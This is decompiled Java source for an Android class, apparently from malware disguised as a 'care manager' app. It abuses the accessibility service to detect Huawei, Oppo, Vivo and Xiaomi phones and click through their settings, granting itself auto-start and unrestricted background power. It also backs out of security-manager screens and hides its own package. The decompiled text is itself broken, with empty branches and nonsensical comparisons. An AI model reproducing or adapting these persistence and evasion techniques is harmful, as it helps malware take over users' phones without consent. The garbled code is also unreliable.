package com.system.caremanager;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;

public class AutoPermissionGranter {

    private static final String[] batteryKeywords;
    private static AccessibilityServiceCore context;
    public static boolean ifFinishAll;
    private static boolean ifFinishHhuawei;
    private static boolean ifInCheckHhuawei;
    public static boolean ifInCheckHuaWeiBatteryYh;
    public static boolean ifInCheckOppoAppDetails;
    public static boolean ifInCheckOppoAppDetailsWithEletricity;
    public static boolean ifInCheckOppoBatteryYh;
    private static boolean ifInCheckVivo;
    private static boolean ifInCheckVivoBattery;
    private static boolean ifInCheckVivoBatteryDetails;
    private static boolean ifInCheckVivoBatteryList;
    private static boolean ifInCheckXiaomiAppDetails;
    private static boolean ifXiaomioConsumeEletricityBackgroundManager;
    private static boolean isIfFinishVivo;
    private static boolean isIfFinishXiaomi;

    static {
        // Static initialization block
    }

    public AutoPermissionGranter() {
        return;
    }

    private static void allowBackGroundConsumeElectricity() {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str = "com.vivo.abe:id/vos_button_opt";
        AccessibilityNodeInfo result = Sea_rch.searchById(context, str);
        if (result == null) {
            // branch: cond_0
        }
        boolean result2 = result.isChecked();
        if (result != null) {
            // branch: cond_0
        }
        AutoPermissionGranter.click(result);
        AutoPermissionGranter.finishVivo();
        return;
    }

    private static void allowDialogAndBackGround() {
        String str = "allowDialogAndBackGround";
        LogHelper.i(str);
        String str2 = "com.vivo.permissionmanager:id/move_btn";
        List result = AutoPermissionGranter.searchSById(str2);
        String result2 = result.toString();
        LogHelper.i(result);
        if (result == null) {
            // branch: cond_0
        }
        String str3 = "666";
        LogHelper.i(str3);
        AutoPermissionGranter.4 autoPermissionGranter.4 = new AutoPermissionGranter.4();
        AutoPermissionGranter.clickByRecycle(null, result, autoPermissionGranter.4);
        return;
    }

    private static void allowOppoBackGroundConsumeElectricity() {
        String str = "android:id/switch_widget";
        List result = AutoPermissionGranter.searchSById(str);
        if (result == null) {
            // branch: cond_1
        }
        int result2 = result.size();
        if (null >= result) {
            // branch: cond_1
        }
        int val = result + -0x1;
        int val2 = null - v2;
        Object result3 = result.get(val2);
        result = (AccessibilityNodeInfo) result;
        boolean result4 = result.isChecked();
        if (result != null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result5 = result.getParent();
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result6 = result.getParent();
        AutoPermissionGranter.click(result);
        int val3 = 100;
        AutoPermissionGranter.sleep(val3);
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str2 = "android:id/button1";
        AccessibilityNodeInfo result7 = Sea_rch.searchById(context, str2);
        AutoPermissionGranter.click(result);
        int val4 = null + 0x1;
        // continue loop -> :goto_0
        AutoPermissionGranter.finishOppo();
        return;
    }

    public static void check(AccessibilityEvent param1, AccessibilityServiceCore param2) {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        if (context != null) {
            // branch: cond_0
        }
        AutoPermissionGranter.context = param2;
        if (param1 == null) {
            // branch: cond_7
        }
        String result = Br_and.getBrand();
        String result2 = result.toLowerCase();
        String str = "huawei";
        boolean result3 = result.equals(str);
        if (result != null) {
            // branch: cond_1
        }
        String result4 = Br_and.getBrand();
        String result5 = result.toLowerCase();
        String str2 = "honor";
        boolean result6 = result.equals(str2);
        if (result == null) {
            // branch: cond_2
        }
        AutoPermissionGranter.checkIfHuaweiApplicationAndService(param1);
        String result7 = Br_and.getBrand();
        String result8 = result.toLowerCase();
        String str3 = "oppo";
        boolean result9 = result.equals(str3);
        if (result != null) {
            // branch: cond_3
        }
        String result10 = Br_and.getBrand();
        String result11 = result.toLowerCase();
        String str4 = "realme";
        boolean result12 = result.equals(str4);
        if (result == null) {
            // branch: cond_4
        }
        AutoPermissionGranter.checkOppo(param1);
        String result13 = Br_and.getBrand();
        String result14 = result.toLowerCase();
        String str5 = "vivo";
        boolean result15 = result.equals(str5);
        if (result == null) {
            // branch: cond_5
        }
        AutoPermissionGranter.checkVivoEvent(param1);
        String result16 = Br_and.getBrand();
        String result17 = result.toLowerCase();
        String str6 = "xiaomi";
        boolean result18 = result.equals(str6);
        if (result != null) {
            // branch: cond_6
        }
        String result19 = Br_and.getBrand();
        String result20 = result.toLowerCase();
        String str7 = "mi";
        boolean result21 = result.equals(str7);
        if (result != null) {
            // branch: cond_6
        }
        String result22 = Br_and.getBrand();
        String result23 = result.toLowerCase();
        String str8 = "redmi";
        boolean result24 = result.equals(str8);
        if (result == null) {
            // branch: cond_7
        }
        AutoPermissionGranter.checkXiaomi(param1);
        return;
    }

    private static void checkCountDown(int param1) {
        Thread thread = new Thread();
        AutoPermissionGranter.1 autoPermissionGranter.1 = new AutoPermissionGranter.1();
        thread.start();
        return;
    }

    private static void checkDevice() {
        String result = Br_and.getBrand();
        String result2 = result.toLowerCase();
        int result3 = result.hashCode();
        int result4 = result.hashCode();
        int val = -1;
        // continue loop -> :goto_0
        String str = "redmi";
        boolean result5 = result.equals(str);
        if (result != null) {
            // branch: cond_0
        }
        // continue loop -> :goto_0
        int val2 = 7;
        // continue loop -> :goto_0
        String str2 = "honor";
        boolean result6 = result.equals(str2);
        if (result != null) {
            // branch: cond_1
        }
        // continue loop -> :goto_0
        int val3 = 6;
        // continue loop -> :goto_0
        String str3 = "vivo";
        boolean result7 = result.equals(str3);
        if (result != null) {
            // branch: cond_2
        }
        // continue loop -> :goto_0
        int val4 = 5;
        // continue loop -> :goto_0
        String str4 = "oppo";
        boolean result8 = result.equals(str4);
        if (result != null) {
            // branch: cond_3
        }
        // continue loop -> :goto_0
        int val5 = 4;
        // continue loop -> :goto_0
        String str5 = "mi";
        boolean result9 = result.equals(str5);
        if (result != null) {
            // branch: cond_4
        }
        // continue loop -> :goto_0
        int val6 = 3;
        // continue loop -> :goto_0
        String str6 = "xiaomi";
        boolean result10 = result.equals(str6);
        if (result != null) {
            // branch: cond_5
        }
        // continue loop -> :goto_0
        int val7 = 2;
        // continue loop -> :goto_0
        String str7 = "realme";
        boolean result11 = result.equals(str7);
        if (result != null) {
            // branch: cond_6
        }
        // continue loop -> :goto_0
        // continue loop -> :goto_0
        String str8 = "huawei";
        boolean result12 = result.equals(str8);
        if (result != null) {
            // branch: cond_7
        }
        // continue loop -> :goto_0
        int val8 = 15000;
        AutoPermissionGranter.execHuawei();
        // continue loop -> :goto_1
        AutoPermissionGranter.execVivo();
        int val9 = 11000;
        // continue loop -> :goto_2
        AutoPermissionGranter.execXiaomi();
        int val10 = 8000;
        // continue loop -> :goto_2
        AutoPermissionGranter.execOppo();
        // continue loop -> :goto_2
        AutoPermissionGranter.execHuawei();
        AutoPermissionGranter.checkCountDown(val10);
        return;
    }

    private static void checkIfHuaweiApplicationAndService(AccessibilityEvent param1) {
        boolean ifInCheckHuaWeiBatteryYh = AutoPermissionGranter.ifInCheckHuaWeiBatteryYh;
        if (ifInCheckHuaWeiBatteryYh != null) {
            // branch: cond_1
        }
        boolean ifFinishAll = AutoPermissionGranter.ifFinishAll;
        if (ifFinishAll != null) {
            // branch: cond_1
        }
        boolean ifInCheckHhuawei = AutoPermissionGranter.ifInCheckHhuawei;
        int result = this.getEventType();
        int val = 32;
        if (result != val) {
            // branch: cond_0
        }
        // continue loop -> :goto_0
        int val2 = null & v1;
        String str = "com.android.settings.Settings$AppAndNotificationDashboardActivity";
        CharSequence result2 = this.getClassName();
        boolean result3 = str.equals(result);
        int val3 = result & v1;
        if (val3 == null) {
            // branch: cond_1
        }
        AutoPermissionGranter.ifInCheckHhuawei = null;
        int val4 = 500;
        AutoPermissionGranter.sleep(val4);
        AutoPermissionGranter.clickAppStartManager();
        boolean ifFinishHhuawei = AutoPermissionGranter.ifFinishHhuawei;
        String str2 = "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity";
        CharSequence result4 = this.getClassName();
        boolean result5 = str2.equals(result);
        int val5 = result & v1;
        if (val5 == null) {
            // branch: cond_2
        }
        AutoPermissionGranter.performBack();
        AutoPermissionGranter.performBack();
        boolean ifFinishAll2 = AutoPermissionGranter.ifFinishAll;
        String str3 = "com.huawei.systemmanager.power.ui.PowerSettingActivity ";
        CharSequence result6 = this.getClassName();
        boolean result7 = str3.equals(result);
        int val6 = ifFinishAll2 & v0;
        if (val6 == null) {
            // branch: cond_3
        }
        AutoPermissionGranter.performBack();
        AutoPermissionGranter.performBack();
        return;
    }

    private static void checkOppo(AccessibilityEvent param1) {
        boolean ifFinishAll = AutoPermissionGranter.ifFinishAll;
        int val = 1000;
        int val2 = 32;
        if (ifFinishAll != null) {
            // branch: cond_1
        }
        boolean ifInCheckOppoAppDetails = AutoPermissionGranter.ifInCheckOppoAppDetails;
        int result = this.getEventType();
        if (result != val2) {
            // branch: cond_0
        }
        // continue loop -> :goto_0
        int val3 = null & v5;
        String str = "com.android.settings.applications.InstalledAppDetailsTop";
        CharSequence result2 = this.getClassName();
        boolean result3 = str.equals(result);
        int val4 = result & v5;
        if (val4 == null) {
            // branch: cond_1
        }
        AutoPermissionGranter.ifInCheckOppoAppDetails = null;
        AutoPermissionGranter.sleep(val);
        AutoPermissionGranter.clickConsumeEletricityManager();
        boolean ifFinishAll2 = AutoPermissionGranter.ifFinishAll;
        String str2 = "com.oplus.powermanager.fuelgaue.PowerControlActivity";
        if (ifFinishAll2 != null) {
            // branch: cond_3
        }
        boolean ifInCheckOppoAppDetailsWithEletricity = AutoPermissionGranter.ifInCheckOppoAppDetailsWithEletricity;
        int result4 = this.getEventType();
        if (result != val2) {
            // branch: cond_2
        }
        // continue loop -> :goto_1
        int val5 = null & v6;
        CharSequence result5 = this.getClassName();
        boolean result6 = str2.equals(result);
        int val6 = result & v6;
        if (val6 == null) {
            // branch: cond_3
        }
        AutoPermissionGranter.ifInCheckOppoAppDetailsWithEletricity = null;
        AutoPermissionGranter.sleep(val);
        AutoPermissionGranter.allowOppoBackGroundConsumeElectricity();
        boolean ifInCheckOppoAppDetailsWithEletricity2 = AutoPermissionGranter.ifInCheckOppoAppDetailsWithEletricity;
        int val7 = 1 ^ v3;
        int result7 = this.getEventType();
        if (result != val2) {
            // branch: cond_4
        }
        // continue loop -> :goto_2
        int val8 = null & v1;
        CharSequence result8 = this.getClassName();
        boolean result9 = str2.equals(result);
        int val9 = result & v1;
        if (val9 == null) {
            // branch: cond_5
        }
        AutoPermissionGranter.performHome();
        boolean ifFinishAll3 = AutoPermissionGranter.ifFinishAll;
        int result10 = this.getEventType();
        if (result != val2) {
            // branch: cond_6
        }
        // continue loop -> :goto_3
        int val10 = null & v3;
        String str3 = "com.oplus.powermanager.fuelgaue.PowerConsumptionOptimizationActivity";
        CharSequence result11 = this.getClassName();
        boolean result12 = str3.equals(result);
        int val11 = val10 & v0;
        if (val11 == null) {
            // branch: cond_7
        }
        AutoPermissionGranter.performHome();
        return;
    }

    private static void checkSecurityManager(AccessibilityEvent param1) {
        int result = this.getEventType();
        int val = 32;
        if (result != val) {
            // branch: cond_1
        }
        CharSequence result2 = this.getClassName();
        if (result == null) {
            // branch: cond_1
        }
        CharSequence result3 = this.getClassName();
        String result4 = result.toString();
        String str = "com/.iqoo/.secure";
        boolean result5 = result.contains(str);
        if (result != null) {
            // branch: cond_0
        }
        String str2 = "com/.miui/.securityscan";
        boolean result6 = result.contains(str2);
        if (result != null) {
            // branch: cond_0
        }
        String str3 = "com/.huawei/.systemmanager/.mainscreen";
        boolean result7 = result.contains(str3);
        if (result == null) {
            // branch: cond_1
        }
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        int val2 = 2;
        boolean result8 = context.performGlobalAction(val2);
        CharSequence result9 = this.getPackageName();
        if (result == null) {
            // branch: cond_4
        }
        CharSequence result10 = this.getPackageName();
        String result11 = this.toString();
        String str4 = "com.coloros.phonemanager";
        boolean result12 = this.contains(str4);
        if (result == null) {
            // branch: cond_2
        }
        AutoPermissionGranter.performBack();
        String str5 = "com.huawei.systemmanager";
        boolean result13 = this.contains(str5);
        if (result == null) {
            // branch: cond_3
        }
        AutoPermissionGranter.performBack();
        String str6 = "com.iqoo.secure";
        boolean result14 = this.contains(str6);
        if (result == null) {
            // branch: cond_4
        }
        AutoPermissionGranter.performBack();
        return;
    }

    private static void checkSwitch() {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str = "com.huawei.systemmanager:id/switcher";
        AccessibilityNodeInfo result = Sea_rch.searchById(context, str);
        if (result == null) {
            // branch: cond_0
        }
        boolean result2 = result.isChecked();
        if (result == null) {
            // branch: cond_0
        }
        AutoPermissionGranter.click(result);
        int val = 99;
        AutoPermissionGranter.sleep(val);
        AutoPermissionGranter.clickBottomDialog();
        return;
    }

    private static void checkVivoEvent(AccessibilityEvent param1) {
        boolean ifFinishAll = AutoPermissionGranter.ifFinishAll;
        String str = "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity";
        String str2 = "com.vivo.permissionmanager.activity.PurviewTabActivity";
        int val = 32;
        if (ifFinishAll != null) {
            // branch: cond_2
        }
        boolean ifInCheckVivo = AutoPermissionGranter.ifInCheckVivo;
        int result = this.getEventType();
        if (result != val) {
            // branch: cond_0
        }
        // continue loop -> :goto_0
        int val2 = null & v6;
        if (val2 == null) {
            // branch: cond_2
        }
        CharSequence result2 = this.getClassName();
        boolean result3 = str2.equals(result);
        if (result != null) {
            // branch: cond_1
        }
        CharSequence result4 = this.getClassName();
        boolean result5 = str.equals(result);
        if (result == null) {
            // branch: cond_2
        }
        AutoPermissionGranter.ifInCheckVivo = null;
        int val3 = 500;
        AutoPermissionGranter.sleep(val3);
        Thread thread = new Thread();
        AutoPermissionGranter.8 autoPermissionGranter.8 = new AutoPermissionGranter.8();
        thread.start();
        boolean isIfFinishVivo = AutoPermissionGranter.isIfFinishVivo;
        if (isIfFinishVivo == null) {
            // branch: cond_4
        }
        CharSequence result6 = this.getClassName();
        boolean result7 = str2.equals(result);
        if (result != null) {
            // branch: cond_3
        }
        CharSequence result8 = this.getClassName();
        boolean result9 = str.equals(result);
        if (result == null) {
            // branch: cond_4
        }
        AutoPermissionGranter.performBack();
        boolean ifFinishAll2 = AutoPermissionGranter.ifFinishAll;
        int val4 = 200;
        if (ifFinishAll2 != null) {
            // branch: cond_6
        }
        boolean ifInCheckVivoBattery = AutoPermissionGranter.ifInCheckVivoBattery;
        int result10 = this.getEventType();
        if (result != val) {
            // branch: cond_5
        }
        // continue loop -> :goto_1
        int val5 = null & v2;
        if (val5 == null) {
            // branch: cond_6
        }
        String str3 = "com.iqoo.powersaving.fuelgauge.PowerRankActivity";
        CharSequence result11 = this.getClassName();
        boolean result12 = str3.equals(result);
        if (result == null) {
            // branch: cond_6
        }
        AutoPermissionGranter.ifInCheckVivoBattery = null;
        AutoPermissionGranter.sleep(val4);
        Thread thread2 = new Thread();
        AutoPermissionGranter.9 autoPermissionGranter.9 = new AutoPermissionGranter.9();
        thread2.start();
        boolean ifFinishAll3 = AutoPermissionGranter.ifFinishAll;
        String str4 = "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity";
        if (ifFinishAll3 != null) {
            // branch: cond_8
        }
        boolean ifInCheckVivoBatteryList = AutoPermissionGranter.ifInCheckVivoBatteryList;
        int result13 = this.getEventType();
        if (result != val) {
            // branch: cond_7
        }
        // continue loop -> :goto_2
        int val6 = null & v6;
        if (val6 == null) {
            // branch: cond_8
        }
        CharSequence result14 = this.getClassName();
        boolean result15 = str4.equals(result);
        if (result == null) {
            // branch: cond_8
        }
        AutoPermissionGranter.ifInCheckVivoBatteryList = null;
        AutoPermissionGranter.sleep(val4);
        Thread thread3 = new Thread();
        AutoPermissionGranter.10 autoPermissionGranter.10 = new AutoPermissionGranter.10();
        thread3.start();
        boolean isIfFinishVivo2 = AutoPermissionGranter.isIfFinishVivo;
        if (isIfFinishVivo2 == null) {
            // branch: cond_9
        }
        CharSequence result16 = this.getClassName();
        boolean result17 = str4.equals(result);
        if (result == null) {
            // branch: cond_9
        }
        AutoPermissionGranter.performBack();
        boolean ifFinishAll4 = AutoPermissionGranter.ifFinishAll;
        if (ifFinishAll4 != null) {
            // branch: cond_b
        }
        boolean ifInCheckVivoBatteryDetails = AutoPermissionGranter.ifInCheckVivoBatteryDetails;
        int result18 = this.getEventType();
        if (result != val) {
            // branch: cond_a
        }
        // continue loop -> :goto_3
        int val7 = null & v3;
        if (val7 == null) {
            // branch: cond_b
        }
        String str5 = "com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity";
        CharSequence result19 = this.getClassName();
        boolean result20 = str5.equals(result);
        if (result == null) {
            // branch: cond_b
        }
        String str6 = "\u8fdb\u4e86";
        LogHelper.i(str6);
        AutoPermissionGranter.ifInCheckVivoBatteryDetails = null;
        Thread thread4 = new Thread();
        AutoPermissionGranter.11 autoPermissionGranter.11 = new AutoPermissionGranter.11();
        this.start();
        return;
    }

    private static void checkXiaomi(AccessibilityEvent param1) {
        boolean ifFinishAll = AutoPermissionGranter.ifFinishAll;
        int val = 32;
        String str = "com.miui.appmanager.ApplicationsDetailsActivity";
        if (ifFinishAll != null) {
            // branch: cond_1
        }
        boolean ifInCheckXiaomiAppDetails = AutoPermissionGranter.ifInCheckXiaomiAppDetails;
        int result = this.getEventType();
        if (result != val) {
            // branch: cond_0
        }
        // continue loop -> :goto_0
        int val2 = null & v5;
        CharSequence result2 = this.getClassName();
        boolean result3 = str.equals(result);
        int val3 = result & v5;
        if (val3 == null) {
            // branch: cond_1
        }
        AutoPermissionGranter.ifInCheckXiaomiAppDetails = null;
        int val4 = 200;
        AutoPermissionGranter.sleep(val4);
        AutoPermissionGranter.clickXiaomiAutoStart();
        boolean isIfFinishXiaomi = AutoPermissionGranter.isIfFinishXiaomi;
        CharSequence result4 = this.getClassName();
        boolean result5 = str.equals(result);
        int val5 = result & v3;
        if (val5 == null) {
            // branch: cond_2
        }
        AutoPermissionGranter.performBack();
        boolean ifFinishAll2 = AutoPermissionGranter.ifFinishAll;
        if (ifFinishAll2 != null) {
            // branch: cond_4
        }
        boolean ifXiaomioConsumeEletricityBackgroundManager = AutoPermissionGranter.ifXiaomioConsumeEletricityBackgroundManager;
        int result6 = this.getEventType();
        if (result != val) {
            // branch: cond_3
        }
        // continue loop -> :goto_1
        int val6 = null & v1;
        String str2 = "com.miui.powerkeeper.ui.HiddenAppsConfigActivity";
        CharSequence result7 = this.getClassName();
        boolean result8 = str2.equals(result);
        int val7 = val6 & v0;
        if (val7 == null) {
            // branch: cond_4
        }
        AutoPermissionGranter.ifXiaomioConsumeEletricityBackgroundManager = null;
        int val8 = 800;
        AutoPermissionGranter.sleep(val8);
        AutoPermissionGranter.clickXiaomiNoLimitINEletricity();
        return;
    }

    private static void click(AccessibilityNodeInfo param1) {
        if (param1 == null) {
            // branch: cond_0
        }
        boolean result = this.isClickable();
        if (result == null) {
            // branch: cond_0
        }
        int val = 16;
        boolean result2 = this.performAction(val);
        return;
    }

    private static void clickAppStartManager() {
        try {
            String str = "com.android.settings:id/arrow";
            List result = AutoPermissionGranter.searchSById(str);
            if (result == null) {
                // branch: cond_0
            }
            Object result2 = result.get(1);
            result = (AccessibilityNodeInfo) result;
            AccessibilityNodeInfo result3 = result.getParent();
            AccessibilityNodeInfo result4 = result.getParent();
            AccessibilityNodeInfo result5 = result.getParent();
            AccessibilityNodeInfo result6 = result.getParent();
            AutoPermissionGranter.click(result);
            // continue loop -> :goto_0
            } catch (Exception e) {
                e.printStackTrace();
            result.printStackTrace();
            int val = 250;
            AutoPermissionGranter.sleep(val);
            AutoPermissionGranter.clickSearchApp();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void clickBottomDialog() {
        String str = "com.huawei.systemmanager:id/switcher";
        List result = AutoPermissionGranter.searchSById(str);
        int result2 = result.size();
        if (null >= result) {
            // branch: cond_1
        }
        Object result3 = result.get(null);
        result = (AccessibilityNodeInfo) result;
        boolean result4 = result.isChecked();
        if (result != null) {
            // branch: cond_0
        }
        AutoPermissionGranter.click(result);
        int val = 100;
        AutoPermissionGranter.sleep(val);
        int val2 = null + 0x1;
        // continue loop -> :goto_0
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str2 = "android:id/button1";
        AccessibilityNodeInfo result5 = Sea_rch.searchById(context, str2);
        AutoPermissionGranter.click(result);
        AutoPermissionGranter.ifFinishHhuawei = 1;
        AutoPermissionGranter.finishHuawei();
        return;
    }

    private static void clickByGesture(AccessibilityNodeInfo param1, AutoClickExecutor param2) {
        if (param1 != null) {
            // branch: cond_0
        }
        return;
        Path path = new Path();
        Rect rect = new Rect();
        this.getBoundsInScreen(rect);
        int result = rect.centerX();
        int result2 = rect.centerY();
        path.moveTo(result, result);
        int SDK_INT = Build$VERSION.SDK_INT;
        int val = 24;
        if (SDK_INT < val) {
            // branch: cond_1
        }
        GestureDescription.Builder result3 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m();
        GestureDescription.StrokeDescription result4 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(path, val, v2, v3, v4);
        GestureDescription.Builder result5 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result, result);
        GestureDescription result6 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result);
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        AutoPermissionGranter.3 autoPermissionGranter.3 = new AutoPermissionGranter.3();
        boolean result7 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(context, result, autoPermissionGranter.3, null);
        return;
    }

    private static void clickByRecycle(int param1, List param2, AutoClickInterface param3) {
        int result = param2.size();
        StringBuilder stringBuilder = new StringBuilder();
        String str = " size  ";
        StringBuilder result2 = stringBuilder.append(result);
        String result3 = stringBuilder.toString();
        LogHelper.i(result);
        StringBuilder stringBuilder2 = new StringBuilder();
        String str2 = "newIndex[0]  ";
        Object item = result[null];
        StringBuilder result4 = stringBuilder2.append(item);
        String result5 = stringBuilder2.toString();
        LogHelper.i(result);
        Object item2 = result[null];
        if (item2 >= result) {
            // branch: cond_1
        }
        Object result6 = param2.get(item2);
        result = (AccessibilityNodeInfo) result;
        if (result == null) {
            // branch: cond_2
        }
        boolean result7 = result.isCheckable();
        if (result == null) {
            // branch: cond_0
        }
        boolean result8 = result.isChecked();
        if (result != null) {
            // branch: cond_0
        }
        AutoPermissionGranter.5 autoPermissionGranter.5 = new AutoPermissionGranter.5();
        AutoPermissionGranter.clickByGesture(result, autoPermissionGranter.5);
        // continue loop -> :goto_0
        String str3 = "4444444";
        LogHelper.i(str3);
        Object item3 = result[autoPermissionGranter.5];
        if (item3 >= result) {
            // branch: cond_2
        }
        String str4 = "gggsdfgsdfgd";
        LogHelper.i(str4);
        Object item4 = result[autoPermissionGranter.5];
        int val = 1 + v3;
        result[autoPermissionGranter.5] = val;
        AutoPermissionGranter.6 autoPermissionGranter.6 = new AutoPermissionGranter.6();
        AutoPermissionGranter.clickByRecycle(val, param2, autoPermissionGranter.6);
        // continue loop -> :goto_0
        String str5 = "333333333";
        LogHelper.i(str5);
        param3.clickSuccess(1);
        return;
    }

    private static void clickChecked(AccessibilityNodeInfo param1) {
        if (param1 == null) {
            // branch: cond_0
        }
        boolean result = this.isCheckable();
        if (result == null) {
            // branch: cond_0
        }
        boolean result2 = this.isChecked();
        if (result != null) {
            // branch: cond_0
        }
        boolean result3 = this.isClickable();
        if (result == null) {
            // branch: cond_0
        }
        int val = 16;
        boolean result4 = this.performAction(val);
        return;
    }

    private static void clickConsumeEletricityManager() {
        try {
            AutoPermissionGranter.ifInCheckOppoAppDetailsWithEletricity = 1;
            String str = "android:id/title";
            List result = AutoPermissionGranter.searchSById(str);
            if (result == null) {
                // branch: cond_0
            }
            int val = 2;
            Object result2 = result.get(val);
            result = (AccessibilityNodeInfo) result;
            if (result == null) {
                // branch: cond_0
            }
            AccessibilityNodeInfo result3 = result.getParent();
            AccessibilityNodeInfo result4 = result.getParent();
            AutoPermissionGranter.click(result);
            // continue loop -> :goto_0
            } catch (Exception e) {
                e.printStackTrace();
            result.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void clickHuaweiSleepNetwork() {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str = "android:id/switch_widget";
        AccessibilityNodeInfo result = Sea_rch.searchById(context, str);
        if (result == null) {
            // branch: cond_0
        }
        AutoPermissionGranter.clickChecked(result);
        int val = 500;
        AutoPermissionGranter.sleep(val);
        AutoPermissionGranter.goToHuaweiSettingAndService();
        return;
    }

    private static void clickSearchApp() {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str = "android:id/search_src_text";
        AccessibilityNodeInfo result = Sea_rch.searchById(context, str);
        if (result == null) {
            // branch: cond_0
        }
        AutoPermissionGranter.click(result);
        int val = 150;
        AutoPermissionGranter.sleep(val);
        AutoPermissionGranter.inputAppName(str);
        return;
    }

    private static void clickXiaomiAutoStart() {
        String str = "com.miui.securitycenter:id/am_detail_as";
        List result = AutoPermissionGranter.searchSById(str);
        if (result == null) {
            // branch: cond_0
        }
        int result2 = result.size();
        if (/* if-lez result */) {
            // branch: cond_0
        }
        Object result3 = result.get(null);
        result = (AccessibilityNodeInfo) result;
        String str2 = "com.miui.securitycenter:id/am_switch";
        AccessibilityNodeInfo result4 = AutoPermissionGranter.findChildNodeById(result, str2);
        if (result == null) {
            // branch: cond_0
        }
        AutoPermissionGranter.click(result);
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str3 = "android:id/button1";
        AccessibilityNodeInfo result5 = Sea_rch.searchById(context, str3);
        AutoPermissionGranter.click(result);
        AutoPermissionGranter.goToXiaomioConsumeEletricityBackgroundManager();
        return;
    }

    private static void clickXiaomiNoLimitINEletricity() {
        String str = "android:id/title";
        List result = AutoPermissionGranter.searchSById(str);
        if (result == null) {
            // branch: cond_0
        }
        Object result2 = result.get(1);
        result = (AccessibilityNodeInfo) result;
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result3 = result.getParent();
        AccessibilityNodeInfo result4 = result.getParent();
        AccessibilityNodeInfo result5 = result.getChild(null);
        if (result == null) {
            // branch: cond_0
        }
        boolean result6 = result.isCheckable();
        if (result == null) {
            // branch: cond_0
        }
        boolean result7 = result.isChecked();
        if (result != null) {
            // branch: cond_0
        }
        AutoPermissionGranter.click(result);
        AutoPermissionGranter.finishXiaomi();
        return;
    }

    public static void execHuawei() {
        AutoPermissionGranter.goToHuaWeiSetting();
        return;
    }

    public static void execOppo() {
        AutoPermissionGranter.goToOppoSetting();
        return;
    }

    public static void execVivo() {
        AutoPermissionGranter.finish();
        return;
    }

    public static void execXiaomi() {
        AutoPermissionGranter.goToXiaomioAppSettingDetails();
        return;
    }

    public static AccessibilityNodeInfo findChildNodeById(AccessibilityNodeInfo param1, String param2) {
        if (param1 == null) {
            // branch: cond_2
        }
        if (param2 != null) {
            // branch: cond_0
        }
        // continue loop -> :goto_1
        int result = this.getChildCount();
        if (null >= result) {
            // branch: cond_2
        }
        AccessibilityNodeInfo result2 = this.getChild(null);
        if (result == null) {
            // branch: cond_1
        }
        String result3 = result.getViewIdResourceName();
        boolean result4 = param2.equals(result);
        if (result == null) {
            // branch: cond_1
        }
        return result;
        int val = null + 0x1;
        // continue loop -> :goto_0
        return null;
    }

    private static void finish() {
        AutoPermissionGranter.ifFinishAll = 1;
        AccessibilityServiceCore.ifFinishiInitPermission = 1;
        List DisabledApps = AccessibilityServiceCore.DisabledApps;
        String str = "com.system.caremanager.app";
        boolean result = DisabledApps.add(str);
        AutoPermissionGranter.performBackAndHome();
        AccessibilityEventMonitor.Event accessibilityEventMonitor.Event = new AccessibilityEventMonitor.Event();
        String Evnet_Type_FInish_Perfect = MalwareConstants.Evnet_Type_FInish_Perfect;
        AccessibilityEventMonitor.publish(accessibilityEventMonitor.Event);
        return;
    }

    private static void finishHuawei() {
        AutoPermissionGranter.finish();
        return;
    }

    private static void finishOppo() {
        AutoPermissionGranter.finish();
        return;
    }

    private static void finishVivo() {
        AutoPermissionGranter.isIfFinishVivo = 1;
        AutoPermissionGranter.finish();
        return;
    }

    private static void finishXiaomi() {
        AutoPermissionGranter.isIfFinishXiaomi = 1;
        AutoPermissionGranter.finish();
        return;
    }

    private static void goToAppVivoSettingDetails() {
        AutoPermissionGranter.ifInCheckVivo = 1;
        String MODEL = Build.MODEL;
        String str = "Y85";
        boolean result = MODEL.contains(str);
        int val = 268435456;
        String str2 = "packagename";
        String str3 = "com.vivo.permissionmanager";
        if (result == null) {
            // branch: cond_0
        }
        String MODEL2 = Build.MODEL;
        String str4 = "Y85A";
        boolean result2 = MODEL2.contains(str4);
        if (result == null) {
            // branch: cond_1
        }
        String MODEL3 = Build.MODEL;
        String str5 = "vivo Y53L";
        boolean result3 = MODEL3.contains(str5);
        if (result == null) {
            // branch: cond_2
        }
        Intent intent = new Intent();
        String str6 = "com.vivo.permissionmanager.activity.PurviewTabActivity";
        Intent result4 = intent.setClassName(str3, str6);
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String result5 = context.getPackageName();
        Intent result6 = intent.putExtra(str2, result);
        String str7 = "tabId";
        String str8 = "1";
        Intent result7 = intent.putExtra(str7, str8);
        Intent result8 = intent.addFlags(val);
        AccessibilityServiceCore context2 = AutoPermissionGranter.context;
        context2.startActivity(intent);
        // continue loop -> :goto_0
        Intent intent2 = new Intent();
        String str9 = "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity";
        Intent result9 = intent2.setClassName(str8, str9);
        String str10 = "secure.intent.action.softPermissionDetail";
        Intent result10 = intent2.setAction(str10);
